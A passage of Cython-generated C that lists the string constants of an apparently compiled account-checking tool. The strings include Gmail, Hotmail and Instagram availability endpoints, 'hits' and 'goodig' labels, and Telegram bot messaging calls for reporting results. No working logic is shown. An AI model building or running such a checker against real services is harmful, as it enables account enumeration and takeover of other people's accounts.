  {&__pyx_n_s_bademail, __pyx_k_bademail, sizeof(__pyx_k_bademail), 0, 0, 1, 1},
  {&__pyx_n_s_badinsta, __pyx_k_badinsta, sizeof(__pyx_k_badinsta), 0, 0, 1, 1},
  {&__pyx_n_u_block, __pyx_k_block, sizeof(__pyx_k_block), 0, 1, 0, 1},
  {&__pyx_n_s_blue, __pyx_k_blue, sizeof(__pyx_k_blue), 0, 0, 1, 1},
  {&__pyx_n_u_c80c5fb30dfae9e273e4009f03b18280, __pyx_k_c80c5fb30dfae9e273e4009f03b18280, sizeof(__pyx_k_c80c5fb30dfae9e273e4009f03b18280), 0, 1, 0, 1},
  {&__pyx_n_s_canary, __pyx_k_canary, sizeof(__pyx_k_canary), 0, 0, 1, 1},
  {&__pyx_n_u_canary, __pyx_k_canary, sizeof(__pyx_k_canary), 0, 1, 0, 1},
  {&__pyx_n_s_cc, __pyx_k_cc, sizeof(__pyx_k_cc), 0, 0, 1, 1},
  {&__pyx_n_u_center, __pyx_k_center, sizeof(__pyx_k_center), 0, 1, 0, 1},
  {&__pyx_n_s_cfonts, __pyx_k_cfonts, sizeof(__pyx_k_cfonts), 0, 0, 1, 1},
  {&__pyx_n_u_cfonts, __pyx_k_cfonts, sizeof(__pyx_k_cfonts), 0, 1, 0, 1},
  {&__pyx_n_s_char, __pyx_k_char, sizeof(__pyx_k_char), 0, 0, 1, 1},
  {&__pyx_n_u_chat_id, __pyx_k_chat_id, sizeof(__pyx_k_chat_id), 0, 1, 0, 1},
  {&__pyx_n_s_check, __pyx_k_check, sizeof(__pyx_k_check), 0, 0, 1, 1},
  {&__pyx_n_s_check_call, __pyx_k_check_call, sizeof(__pyx_k_check_call), 0, 0, 1, 1},
  {&__pyx_n_s_check_gmail, __pyx_k_check_gmail, sizeof(__pyx_k_check_gmail), 0, 0, 1, 1},
  {&__pyx_n_s_choice, __pyx_k_choice, sizeof(__pyx_k_choice), 0, 0, 1, 1},
  {&__pyx_n_s_choices, __pyx_k_choices, sizeof(__pyx_k_choices), 0, 0, 1, 1},
  {&__pyx_n_s_clear, __pyx_k_clear, sizeof(__pyx_k_clear), 0, 0, 1, 1},
  {&__pyx_n_u_clear, __pyx_k_clear, sizeof(__pyx_k_clear), 0, 1, 0, 1},
  {&__pyx_n_u_clientExperiments, __pyx_k_clientExperiments, sizeof(__pyx_k_clientExperiments), 0, 1, 0, 1},
  {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},
  {&__pyx_n_s_clock_emoji, __pyx_k_clock_emoji, sizeof(__pyx_k_clock_emoji), 0, 0, 1, 1},
  {&__pyx_n_s_close, __pyx_k_close, sizeof(__pyx_k_close), 0, 0, 1, 1},
  {&__pyx_kp_u_code, __pyx_k_code, sizeof(__pyx_k_code), 0, 1, 0, 0},
  {&__pyx_kp_u_code_a_href_https_instagram_com, __pyx_k_code_a_href_https_instagram_com, sizeof(__pyx_k_code_a_href_https_instagram_com), 0, 1, 0, 0},
  {&__pyx_kp_u_code_code, __pyx_k_code_code, sizeof(__pyx_k_code_code), 0, 1, 0, 0},
  {&__pyx_kp_u_code_code_2, __pyx_k_code_code_2, sizeof(__pyx_k_code_code_2), 0, 1, 0, 0},
  {&__pyx_n_s_colors, __pyx_k_colors, sizeof(__pyx_k_colors), 0, 0, 1, 1},
  {&__pyx_kp_u_content_type, __pyx_k_content_type, sizeof(__pyx_k_content_type), 0, 1, 0, 0},
  {&__pyx_kp_u_continue_https_3A_2F_2Fmail_goog, __pyx_k_continue_https_3A_2F_2Fmail_goog, sizeof(__pyx_k_continue_https_3A_2F_2Fmail_goog), 0, 1, 0, 0},
  {&__pyx_n_u_control, __pyx_k_control, sizeof(__pyx_k_control), 0, 1, 0, 1},
  {&__pyx_n_s_cookies, __pyx_k_cookies, sizeof(__pyx_k_cookies), 0, 0, 1, 1},
  {&__pyx_n_u_cors, __pyx_k_cors, sizeof(__pyx_k_cors), 0, 1, 0, 1},
  {&__pyx_n_s_csrf, __pyx_k_csrf, sizeof(__pyx_k_csrf), 0, 0, 1, 1},
  {&__pyx_n_u_csrftoken, __pyx_k_csrftoken, sizeof(__pyx_k_csrftoken), 0, 1, 0, 1},
  {&__pyx_n_u_csrftoken_2, __pyx_k_csrftoken_2, sizeof(__pyx_k_csrftoken_2), 0, 1, 0, 1},
  {&__pyx_n_s_cyan, __pyx_k_cyan, sizeof(__pyx_k_cyan), 0, 0, 1, 1},
  {&__pyx_n_u_cyan, __pyx_k_cyan, sizeof(__pyx_k_cyan), 0, 1, 0, 1},
  {&__pyx_n_s_data, __pyx_k_data, sizeof(__pyx_k_data), 0, 0, 1, 1},
  {&__pyx_n_u_data, __pyx_k_data, sizeof(__pyx_k_data), 0, 1, 0, 1},
  {&__pyx_kp_u_data_initial_setup_data_null_nul, __pyx_k_data_initial_setup_data_null_nul, sizeof(__pyx_k_data_initial_setup_data_null_nul), 0, 1, 0, 0},
  {&__pyx_n_s_date, __pyx_k_date, sizeof(__pyx_k_date), 0, 0, 1, 1},
  {&__pyx_n_s_datetime, __pyx_k_datetime, sizeof(__pyx_k_datetime), 0, 0, 1, 1},
  {&__pyx_n_s_datte, __pyx_k_datte, sizeof(__pyx_k_datte), 0, 0, 1, 1},
  {&__pyx_n_s_decode, __pyx_k_decode, sizeof(__pyx_k_decode), 0, 0, 1, 1},
  {&__pyx_n_s_dev, __pyx_k_dev, sizeof(__pyx_k_dev), 0, 0, 1, 1},
  {&__pyx_n_s_device_id, __pyx_k_device_id, sizeof(__pyx_k_device_id), 0, 0, 1, 1},
  {&__pyx_n_u_device_id, __pyx_k_device_id, sizeof(__pyx_k_device_id), 0, 1, 0, 1},
  {&__pyx_n_u_deviceinfo, __pyx_k_deviceinfo, sizeof(__pyx_k_deviceinfo), 0, 1, 0, 1},
  {&__pyx_n_s_digits, __pyx_k_digits, sizeof(__pyx_k_digits), 0, 0, 1, 1},
  {&__pyx_n_s_doc, __pyx_k_doc, sizeof(__pyx_k_doc), 0, 0, 1, 1},
  {&__pyx_n_u_doc_id, __pyx_k_doc_id, sizeof(__pyx_k_doc_id), 0, 1, 0, 1},
  {&__pyx_n_s_dumps, __pyx_k_dumps, sizeof(__pyx_k_dumps), 0, 0, 1, 1},
  {&__pyx_n_s_e, __pyx_k_e, sizeof(__pyx_k_e), 0, 0, 1, 1},
  {&__pyx_n_s_eizon, __pyx_k_eizon, sizeof(__pyx_k_eizon), 0, 0, 1, 1},
  {&__pyx_n_u_eizon, __pyx_k_eizon, sizeof(__pyx_k_eizon), 0, 1, 0, 1},
  {&__pyx_n_s_email, __pyx_k_email, sizeof(__pyx_k_email), 0, 0, 1, 1},
  {&__pyx_n_u_email, __pyx_k_email, sizeof(__pyx_k_email), 0, 1, 0, 1},
  {&__pyx_n_s_emails, __pyx_k_emails, sizeof(__pyx_k_emails), 0, 0, 1, 1},
  {&__pyx_n_u_empty, __pyx_k_empty, sizeof(__pyx_k_empty), 0, 1, 0, 1},
  {&__pyx_kp_u_en_GB_en_US, __pyx_k_en_GB_en_US, sizeof(__pyx_k_en_GB_en_US), 0, 1, 0, 0},
  {&__pyx_kp_u_en_US_en_q_0_9, __pyx_k_en_US_en_q_0_9, sizeof(__pyx_k_en_US_en_q_0_9), 0, 1, 0, 0},
  {&__pyx_n_u_enablejspublickeydeprecationexpe, __pyx_k_enablejspublickeydeprecationexpe, sizeof(__pyx_k_enablejspublickeydeprecationexpe), 0, 1, 0, 1},
  {&__pyx_n_u_enablejspublickeydeprecationexpe_2, __pyx_k_enablejspublickeydeprecationexpe_2, sizeof(__pyx_k_enablejspublickeydeprecationexpe_2), 0, 1, 0, 1},
  {&__pyx_n_u_enablejspublickeydeprecationexpe_3, __pyx_k_enablejspublickeydeprecationexpe_3, sizeof(__pyx_k_enablejspublickeydeprecationexpe_3), 0, 1, 0, 1},
  {&__pyx_n_s_encode, __pyx_k_encode, sizeof(__pyx_k_encode), 0, 0, 1, 1},
  {&__pyx_n_s_enter, __pyx_k_enter, sizeof(__pyx_k_enter), 0, 0, 1, 1},
  {&__pyx_n_s_executable, __pyx_k_executable, sizeof(__pyx_k_executable), 0, 0, 1, 1},
  {&__pyx_n_s_exit, __pyx_k_exit, sizeof(__pyx_k_exit), 0, 0, 1, 1},
  {&__pyx_n_s_exit_2, __pyx_k_exit_2, sizeof(__pyx_k_exit_2), 0, 0, 1, 1},
  {&__pyx_n_s_f, __pyx_k_f, sizeof(__pyx_k_f), 0, 0, 1, 1},
  {&__pyx_kp_u_f_req, __pyx_k_f_req, sizeof(__pyx_k_f_req), 0, 1, 0, 0},
  {&__pyx_n_s_ff, __pyx_k_ff, sizeof(__pyx_k_ff), 0, 0, 1, 1},
  {&__pyx_n_s_first_name, __pyx_k_first_name, sizeof(__pyx_k_first_name), 0, 0, 1, 1},
  {&__pyx_n_u_first_name, __pyx_k_first_name, sizeof(__pyx_k_first_name), 0, 1, 0, 1},
  {&__pyx_n_s_flush, __pyx_k_flush, sizeof(__pyx_k_flush), 0, 0, 1, 1},
  {&__pyx_n_u_follower_count, __pyx_k_follower_count, sizeof(__pyx_k_follower_count), 0, 1, 0, 1},
  {&__pyx_n_u_following_count, __pyx_k_following_count, sizeof(__pyx_k_following_count), 0, 1, 0, 1},
  {&__pyx_n_s_font, __pyx_k_font, sizeof(__pyx_k_font), 0, 0, 1, 1},
  {&__pyx_n_s_fowg, __pyx_k_fowg, sizeof(__pyx_k_fowg), 0, 0, 1, 1},
  {&__pyx_n_s_fows, __pyx_k_fows, sizeof(__pyx_k_fows), 0, 0, 1, 1},
  {&__pyx_n_s_generate_user_agent, __pyx_k_generate_user_agent, sizeof(__pyx_k_generate_user_agent), 0, 0, 1, 1},
  {&__pyx_n_s_genexpr, __pyx_k_genexpr, sizeof(__pyx_k_genexpr), 0, 0, 1, 1},
  {&__pyx_n_s_get, __pyx_k_get, sizeof(__pyx_k_get), 0, 0, 1, 1},
  {&__pyx_kp_u_getChat, __pyx_k_getChat, sizeof(__pyx_k_getChat), 0, 1, 0, 0},
  {&__pyx_kp_u_getMe, __pyx_k_getMe, sizeof(__pyx_k_getMe), 0, 1, 0, 0},
  {&__pyx_n_s_get_bot_info, __pyx_k_get_bot_info, sizeof(__pyx_k_get_bot_info), 0, 0, 1, 1},
  {&__pyx_n_s_get_dict, __pyx_k_get_dict, sizeof(__pyx_k_get_dict), 0, 0, 1, 1},
  {&__pyx_n_s_get_user_info, __pyx_k_get_user_info, sizeof(__pyx_k_get_user_info), 0, 0, 1, 1},
  {&__pyx_kp_u_gf_uar_1, __pyx_k_gf_uar_1, sizeof(__pyx_k_gf_uar_1), 0, 1, 0, 0},
  {&__pyx_n_s_gg, __pyx_k_gg, sizeof(__pyx_k_gg), 0, 0, 1, 1},
  {&__pyx_n_s_ggb, __pyx_k_ggb, sizeof(__pyx_k_ggb), 0, 0, 1, 1},
  {&__pyx_kp_u_gmail_com, __pyx_k_gmail_com, sizeof(__pyx_k_gmail_com), 0, 1, 0, 0},
  {&__pyx_n_s_goodig, __pyx_k_goodig, sizeof(__pyx_k_goodig), 0, 0, 1, 1},
  {&__pyx_kp_u_google_accounts_xsrf, __pyx_k_google_accounts_xsrf, sizeof(__pyx_k_google_accounts_xsrf), 0, 1, 0, 0},
  {&__pyx_n_s_green, __pyx_k_green, sizeof(__pyx_k_green), 0, 0, 1, 1},
  {&__pyx_n_s_group, __pyx_k_group, sizeof(__pyx_k_group), 0, 0, 1, 1},
  {&__pyx_n_u_guid, __pyx_k_guid, sizeof(__pyx_k_guid), 0, 1, 0, 1},
  {&__pyx_kp_u_gzip_deflate, __pyx_k_gzip_deflate, sizeof(__pyx_k_gzip_deflate), 0, 1, 0, 0},
  {&__pyx_n_s_hashlib, __pyx_k_hashlib, sizeof(__pyx_k_hashlib), 0, 0, 1, 1},
  {&__pyx_n_u_hashlib, __pyx_k_hashlib, sizeof(__pyx_k_hashlib), 0, 1, 0, 1},
  {&__pyx_n_s_he3, __pyx_k_he3, sizeof(__pyx_k_he3), 0, 0, 1, 1},
  {&__pyx_n_s_headers, __pyx_k_headers, sizeof(__pyx_k_headers), 0, 0, 1, 1},
  {&__pyx_n_s_hexdigest, __pyx_k_hexdigest, sizeof(__pyx_k_hexdigest), 0, 0, 1, 1},
  {&__pyx_n_s_hits, __pyx_k_hits, sizeof(__pyx_k_hits), 0, 0, 1, 1},
  {&__pyx_n_s_host, __pyx_k_host, sizeof(__pyx_k_host), 0, 0, 1, 1},
  {&__pyx_n_s_hotmail, __pyx_k_hotmail, sizeof(__pyx_k_hotmail), 0, 0, 1, 1},
  {&__pyx_kp_u_hotmail_com, __pyx_k_hotmail_com, sizeof(__pyx_k_hotmail_com), 0, 1, 0, 0},
  {&__pyx_n_s_hour, __pyx_k_hour, sizeof(__pyx_k_hour), 0, 0, 1, 1},
  {&__pyx_n_s_hours, __pyx_k_hours, sizeof(__pyx_k_hours), 0, 0, 1, 1},
  {&__pyx_kp_u_https_accounts_google_com, __pyx_k_https_accounts_google_com, sizeof(__pyx_k_https_accounts_google_com), 0, 1, 0, 0},
  {&__pyx_kp_u_https_accounts_google_com___sign, __pyx_k_https_accounts_google_com___sign, sizeof(__pyx_k_https_accounts_google_com___sign), 0, 1, 0, 0},
  {&__pyx_kp_u_https_accounts_google_com___sign_2, __pyx_k_https_accounts_google_com___sign_2, sizeof(__pyx_k_https_accounts_google_com___sign_2), 0, 1, 0, 0},
  {&__pyx_kp_u_https_accounts_google_com_signin, __pyx_k_https_accounts_google_com_signin, sizeof(__pyx_k_https_accounts_google_com_signin), 0, 1, 0, 0},
  {&__pyx_kp_u_https_accounts_google_com_signup, __pyx_k_https_accounts_google_com_signup, sizeof(__pyx_k_https_accounts_google_com_signup), 0, 1, 0, 0},
  {&__pyx_kp_u_https_accounts_google_com_signup_2, __pyx_k_https_accounts_google_com_signup_2, sizeof(__pyx_k_https_accounts_google_com_signup_2), 0, 1, 0, 0},
  {&__pyx_kp_u_https_api_ig_storiesig_info_api, __pyx_k_https_api_ig_storiesig_info_api, sizeof(__pyx_k_https_api_ig_storiesig_info_api), 0, 1, 0, 0},
  {&__pyx_kp_u_https_api_telegram_org_bot, __pyx_k_https_api_telegram_org_bot, sizeof(__pyx_k_https_api_telegram_org_bot), 0, 1, 0, 0},
  {&__pyx_kp_u_https_i_instagram_com_api_v1_acc, __pyx_k_https_i_instagram_com_api_v1_acc, sizeof(__pyx_k_https_i_instagram_com_api_v1_acc), 0, 1, 0, 0},
  {&__pyx_kp_u_https_signup_live_com, __pyx_k_https_signup_live_com, sizeof(__pyx_k_https_signup_live_com), 0, 1, 0, 0},
  {&__pyx_kp_u_https_signup_live_com_API_CheckA, __pyx_k_https_signup_live_com_API_CheckA, sizeof(__pyx_k_https_signup_live_com_API_CheckA), 0, 1, 0, 0},
  {&__pyx_kp_u_https_signup_live_com_API_Evalua, __pyx_k_https_signup_live_com_API_Evalua, sizeof(__pyx_k_https_signup_live_com_API_Evalua), 0, 1, 0, 0},
  {&__pyx_kp_u_https_signup_live_com_signup, __pyx_k_https_signup_live_com_signup, sizeof(__pyx_k_https_signup_live_com_signup), 0, 1, 0, 0},
  {&__pyx_kp_u_https_signup_live_com_signup_lic, __pyx_k_https_signup_live_com_signup_lic, sizeof(__pyx_k_https_signup_live_com_signup_lic), 0, 1, 0, 0},
  {&__pyx_kp_u_https_signup_live_com_signup_lic_2, __pyx_k_https_signup_live_com_signup_lic_2, sizeof(__pyx_k_https_signup_live_com_signup_lic_2), 0, 1, 0, 0},
  {&__pyx_kp_u_https_storiesig_info, __pyx_k_https_storiesig_info, sizeof(__pyx_k_https_storiesig_info), 0, 1, 0, 0},
  {&__pyx_kp_u_https_storiesig_info_2, __pyx_k_https_storiesig_info_2, sizeof(__pyx_k_https_storiesig_info_2), 0, 1, 0, 0},
  {&__pyx_kp_u_https_t_me_Python_Tools7, __pyx_k_https_t_me_Python_Tools7, sizeof(__pyx_k_https_t_me_Python_Tools7), 0, 1, 0, 0},
  {&__pyx_kp_u_https_www_instagram_com_accounts, __pyx_k_https_www_instagram_com_accounts, sizeof(__pyx_k_https_www_instagram_com_accounts), 0, 1, 0, 0},
  {&__pyx_kp_u_https_www_instagram_com_api_grap, __pyx_k_https_www_instagram_com_api_grap, sizeof(__pyx_k_https_www_instagram_com_api_grap), 0, 1, 0, 0},
  {&__pyx_n_s_hy, __pyx_k_hy, sizeof(__pyx_k_hy), 0, 0, 1, 1},
  {&__pyx_n_s_i, __pyx_k_i, sizeof(__pyx_k_i), 0, 0, 1, 1},
  {&__pyx_kp_u_i_instagram_com, __pyx_k_i_instagram_com, sizeof(__pyx_k_i_instagram_com), 0, 1, 0, 0},
  {&__pyx_n_u_id, __pyx_k_id, sizeof(__pyx_k_id), 0, 1, 0, 1},
  {&__pyx_n_u_ig_sig_key_version, __pyx_k_ig_sig_key_version, sizeof(__pyx_k_ig_sig_key_version), 0, 1, 0, 1},
  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},
  {&__pyx_n_s_import_module, __pyx_k_import_module, sizeof(__pyx_k_import_module), 0, 0, 1, 1},
  {&__pyx_n_s_importlib, __pyx_k_importlib, sizeof(__pyx_k_importlib), 0, 0, 1, 1},
  {&__pyx_n_s_init, __pyx_k_init, sizeof(__pyx_k_init), 0, 0, 1, 1},
  {&__pyx_n_s_input, __pyx_k_input, sizeof(__pyx_k_input), 0, 0, 1, 1},
  {&__pyx_n_u_install, __pyx_k_install, sizeof(__pyx_k_install), 0, 1, 0, 1},
  {&__pyx_kp_u_isAvailable_true, __pyx_k_isAvailable_true, sizeof(__pyx_k_isAvailable_true), 0, 1, 0, 0},
  {&__pyx_n_s_json, __pyx_k_json, sizeof(__pyx_k_json), 0, 0, 1, 1},
  {&__pyx_n_s_json_data, __pyx_k_json_data, sizeof(__pyx_k_json_data), 0, 0, 1, 1},
  {&__pyx_n_s_k, __pyx_k_k, sizeof(__pyx_k_k), 0, 0, 1, 1},
  {&__pyx_kp_u_keep_alive, __pyx_k_keep_alive, sizeof(__pyx_k_keep_alive), 0, 1, 0, 0},
  {&__pyx_n_s_library, __pyx_k_library, sizeof(__pyx_k_library), 0, 0, 1, 1},
  {&__pyx_n_s_loading_animation, __pyx_k_loading_animation, sizeof(__pyx_k_loading_animation), 0, 0, 1, 1},
  {&__pyx_n_s_loading_chars, __pyx_k_loading_chars, sizeof(__pyx_k_loading_chars), 0, 0, 1, 1},
  {&__pyx_n_s_logo, __pyx_k_logo, sizeof(__pyx_k_logo), 0, 0, 1, 1},
  {&__pyx_n_u_lsd, __pyx_k_lsd, sizeof(__pyx_k_lsd), 0, 1, 0, 1},
  {&__pyx_kp_u_m, __pyx_k_m, sizeof(__pyx_k_m), 0, 1, 0, 0},
  {&__pyx_n_u_m_2, __pyx_k_m_2, sizeof(__pyx_k_m_2), 0, 1, 0, 1},
  {&__pyx_n_s_magenta, __pyx_k_magenta, sizeof(__pyx_k_magenta), 0, 0, 1, 1},
  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},
  {&__pyx_n_u_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 1, 0, 1},
  {&__pyx_n_s_md5, __pyx_k_md5, sizeof(__pyx_k_md5), 0, 0, 1, 1},
  {&__pyx_n_u_media_count, __pyx_k_media_count, sizeof(__pyx_k_media_count), 0, 1, 0, 1},
  {&__pyx_n_s_memo, __pyx_k_memo, sizeof(__pyx_k_memo), 0, 0, 1, 1},
  {&__pyx_n_s_metaclass, __pyx_k_metaclass, sizeof(__pyx_k_metaclass), 0, 0, 1, 1},
  {&__pyx_kp_u_mid_ZVfGvgABAAGoQqa7AY3mgoYBV1nP, __pyx_k_mid_ZVfGvgABAAGoQqa7AY3mgoYBV1nP, sizeof(__pyx_k_mid_ZVfGvgABAAGoQqa7AY3mgoYBV1nP), 0, 1, 0, 0},
  {&__pyx_n_s_module, __pyx_k_module, sizeof(__pyx_k_module), 0, 0, 1, 1},
  {&__pyx_n_s_n1, __pyx_k_n1, sizeof(__pyx_k_n1), 0, 0, 1, 1},
  {&__pyx_n_s_n2, __pyx_k_n2, sizeof(__pyx_k_n2), 0, 0, 1, 1},
  {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},
  {&__pyx_kp_u_no_REST, __pyx_k_no_REST, sizeof(__pyx_k_no_REST), 0, 1, 0, 0},
  {&__pyx_n_u_none, __pyx_k_none, sizeof(__pyx_k_none), 0, 1, 0, 1},
  {&__pyx_n_s_now, __pyx_k_now, sizeof(__pyx_k_now), 0, 0, 1, 1},
  {&__pyx_kp_u_null, __pyx_k_null, sizeof(__pyx_k_null), 0, 1, 0, 0},
  {&__pyx_kp_u_null_null_null_null_null_NL_nul, __pyx_k_null_null_null_null_null_NL_nul, sizeof(__pyx_k_null_null_null_null_null_NL_nul), 0, 1, 0, 0},
  {&__pyx_n_s_o, __pyx_k_o, sizeof(__pyx_k_o), 0, 0, 1, 1},
  {&__pyx_n_s_ok, __pyx_k_ok, sizeof(__pyx_k_ok), 0, 0, 1, 1},
  {&__pyx_n_u_ok, __pyx_k_ok, sizeof(__pyx_k_ok), 0, 1, 0, 1},
  {&__pyx_n_s_open, __pyx_k_open, sizeof(__pyx_k_open), 0, 0, 1, 1},
  {&__pyx_n_s_orange, __pyx_k_orange, sizeof(__pyx_k_orange), 0, 0, 1, 1},
  {&__pyx_n_u_origin, __pyx_k_origin, sizeof(__pyx_k_origin), 0, 1, 0, 1},
  {&__pyx_n_s_os, __pyx_k_os, sizeof(__pyx_k_os), 0, 0, 1, 1},
  {&__pyx_n_u_parallax, __pyx_k_parallax, sizeof(__pyx_k_parallax), 0, 1, 0, 1},
  {&__pyx_n_s_params, __pyx_k_params, sizeof(__pyx_k_params), 0, 0, 1, 1},
  {&__pyx_kp_u_parse_mode_HTML, __pyx_k_parse_mode_HTML, sizeof(__pyx_k_parse_mode_HTML), 0, 1, 0, 0},
  {&__pyx_n_u_pip, __pyx_k_pip, sizeof(__pyx_k_pip), 0, 1, 0, 1},
  {&__pyx_n_u_pk, __pyx_k_pk, sizeof(__pyx_k_pk), 0, 1, 0, 1},
  {&__pyx_n_s_post, __pyx_k_post, sizeof(__pyx_k_post), 0, 0, 1, 1},
  {&__pyx_n_s_pp, __pyx_k_pp, sizeof(__pyx_k_pp), 0, 0, 1, 1},
  {&__pyx_n_s_pppp, __pyx_k_pppp, sizeof(__pyx_k_pppp), 0, 0, 1, 1},
  {&__pyx_n_s_prepare, __pyx_k_prepare, sizeof(__pyx_k_prepare), 0, 0, 1, 1},
  {&__pyx_n_s_print, __pyx_k_print, sizeof(__pyx_k_print), 0, 0, 1, 1},
  {&__pyx_n_u_priority, __pyx_k_priority, sizeof(__pyx_k_priority), 0, 1, 0, 1},
  {&__pyx_n_s_qualname, __pyx_k_qualname, sizeof(__pyx_k_qualname), 0, 0, 1, 1},
  {&__pyx_n_u_query, __pyx_k_query, sizeof(__pyx_k_query), 0, 1, 0, 1},
  {&__pyx_n_s_r, __pyx_k_r, sizeof(__pyx_k_r), 0, 0, 1, 1},
  {&__pyx_n_u_r, __pyx_k_r, sizeof(__pyx_k_r), 0, 1, 0, 1},
  {&__pyx_n_s_randint, __pyx_k_randint, sizeof(__pyx_k_randint), 0, 0, 1, 1},
  {&__pyx_n_s_random, __pyx_k_random, sizeof(__pyx_k_random), 0, 0, 1, 1},
  {&__pyx_n_u_random, __pyx_k_random, sizeof(__pyx_k_random), 0, 1, 0, 1},
  {&__pyx_n_s_randrange, __pyx_k_randrange, sizeof(__pyx_k_randrange), 0, 0, 1, 1},
  {&__pyx_n_s_range, __pyx_k_range, sizeof(__pyx_k_range), 0, 0, 1, 1},
  {&__pyx_n_s_ranges, __pyx_k_ranges, sizeof(__pyx_k_ranges), 0, 0, 1, 1},
  {&__pyx_n_s_re, __pyx_k_re, sizeof(__pyx_k_re), 0, 0, 1, 1},
  {&__pyx_n_s_read, __pyx_k_read, sizeof(__pyx_k_read), 0, 0, 1, 1},
  {&__pyx_n_s_red, __pyx_k_red, sizeof(__pyx_k_red), 0, 0, 1, 1},
  {&__pyx_n_s_red6, __pyx_k_red6, sizeof(__pyx_k_red6), 0, 0, 1, 1},
  {&__pyx_n_u_referer, __pyx_k_referer, sizeof(__pyx_k_referer), 0, 1, 0, 1},
  {&__pyx_n_s_render, __pyx_k_render, sizeof(__pyx_k_render), 0, 0, 1, 1},
  {&__pyx_n_u_render_surface, __pyx_k_render_surface, sizeof(__pyx_k_render_surface), 0, 1, 0, 1},
  {&__pyx_n_s_requests, __pyx_k_requests, sizeof(__pyx_k_requests), 0, 0, 1, 1},
  {&__pyx_n_u_requests, __pyx_k_requests, sizeof(__pyx_k_requests), 0, 1, 0, 1},
  {&__pyx_n_s_res, __pyx_k_res, sizeof(__pyx_k_res), 0, 0, 1, 1},
  {&__pyx_n_s_res1, __pyx_k_res1, sizeof(__pyx_k_res1), 0, 0, 1, 1},
  {&__pyx_n_s_reset, __pyx_k_reset, sizeof(__pyx_k_reset), 0, 0, 1, 1},
  {&__pyx_n_s_response, __pyx_k_response, sizeof(__pyx_k_response), 0, 0, 1, 1},
  {&__pyx_n_s_rest, __pyx_k_rest, sizeof(__pyx_k_rest), 0, 0, 1, 1},
  {&__pyx_n_u_result, __pyx_k_result, sizeof(__pyx_k_result), 0, 1, 0, 1},
  {&__pyx_n_u_rich, __pyx_k_rich, sizeof(__pyx_k_rich), 0, 1, 0, 1},
  {&__pyx_n_s_rich_console, __pyx_k_rich_console, sizeof(__pyx_k_rich_console), 0, 0, 1, 1},
  {&__pyx_n_s_rich_table, __pyx_k_rich_table, sizeof(__pyx_k_rich_table), 0, 0, 1, 1},
  {&__pyx_n_s_ror, __pyx_k_ror, sizeof(__pyx_k_ror), 0, 0, 1, 1},
  {&__pyx_n_s_rr, __pyx_k_rr, sizeof(__pyx_k_rr), 0, 0, 1, 1},
  {&__pyx_n_s_rrr, __pyx_k_rrr, sizeof(__pyx_k_rrr), 0, 0, 1, 1},
  {&__pyx_kp_u_s, __pyx_k_s, sizeof(__pyx_k_s), 0, 1, 0, 0},
  {&__pyx_n_s_s6, __pyx_k_s6, sizeof(__pyx_k_s6), 0, 0, 1, 1},
  {&__pyx_kp_u_s_2, __pyx_k_s_2, sizeof(__pyx_k_s_2), 0, 1, 0, 0},
  {&__pyx_kp_u_s_3, __pyx_k_s_3, sizeof(__pyx_k_s_3), 0, 1, 0, 0},
  {&__pyx_kp_u_s_4, __pyx_k_s_4, sizeof(__pyx_k_s_4), 0, 1, 0, 0},
  {&__pyx_kp_u_s_s, __pyx_k_s_s, sizeof(__pyx_k_s_s), 0, 1, 0, 0},
  {&__pyx_kp_u_s_s_2, __pyx_k_s_s_2, sizeof(__pyx_k_s_s_2), 0, 1, 0, 0},
  {&__pyx_kp_u_s_s_3, __pyx_k_s_s_3, sizeof(__pyx_k_s_s_3), 0, 1, 0, 0},
  {&__pyx_kp_u_s_s_s, __pyx_k_s_s_s, sizeof(__pyx_k_s_s_s), 0, 1, 0, 0},
  {&__pyx_kp_u_s_ss, __pyx_k_s_ss, sizeof(__pyx_k_s_ss), 0, 1, 0, 0},
  {&__pyx_kp_u_same_site, __pyx_k_same_site, sizeof(__pyx_k_same_site), 0, 1, 0, 0},
  {&__pyx_n_s_search, __pyx_k_search, sizeof(__pyx_k_search), 0, 0, 1, 1},
  {&__pyx_kp_u_sec_ch_ua, __pyx_k_sec_ch_ua, sizeof(__pyx_k_sec_ch_ua), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_ch_ua_mobile, __pyx_k_sec_ch_ua_mobile, sizeof(__pyx_k_sec_ch_ua_mobile), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_ch_ua_platform, __pyx_k_sec_ch_ua_platform, sizeof(__pyx_k_sec_ch_ua_platform), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_fetch_dest, __pyx_k_sec_fetch_dest, sizeof(__pyx_k_sec_fetch_dest), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_fetch_mode, __pyx_k_sec_fetch_mode, sizeof(__pyx_k_sec_fetch_mode), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_fetch_site, __pyx_k_sec_fetch_site, sizeof(__pyx_k_sec_fetch_site), 0, 1, 0, 0},
  {&__pyx_n_s_self, __pyx_k_self, sizeof(__pyx_k_self), 0, 0, 1, 1},
  {&__pyx_n_s_send, __pyx_k_send, sizeof(__pyx_k_send), 0, 0, 1, 1},
  {&__pyx_kp_u_sendMessage_chat_id, __pyx_k_sendMessage_chat_id, sizeof(__pyx_k_sendMessage_chat_id), 0, 1, 0, 0},
  {&__pyx_n_s_session, __pyx_k_session, sizeof(__pyx_k_session), 0, 0, 1, 1},
  {&__pyx_n_u_signInName, __pyx_k_signInName, sizeof(__pyx_k_signInName), 0, 1, 0, 1},
  {&__pyx_n_u_signed_body, __pyx_k_signed_body, sizeof(__pyx_k_signed_body), 0, 1, 0, 1},
  {&__pyx_kp_u_signup_live_com, __pyx_k_signup_live_com, sizeof(__pyx_k_signup_live_com), 0, 1, 0, 0},
  {&__pyx_n_s_sleep, __pyx_k_sleep, sizeof(__pyx_k_sleep), 0, 0, 1, 1},
  {&__pyx_n_s_sn73, __pyx_k_sn73, sizeof(__pyx_k_sn73), 0, 0, 1, 1},
  {&__pyx_n_s_source, __pyx_k_source, sizeof(__pyx_k_source), 0, 0, 1, 1},
  {&__pyx_kp_s_source_py, __pyx_k_source_py, sizeof(__pyx_k_source_py), 0, 0, 1, 0},
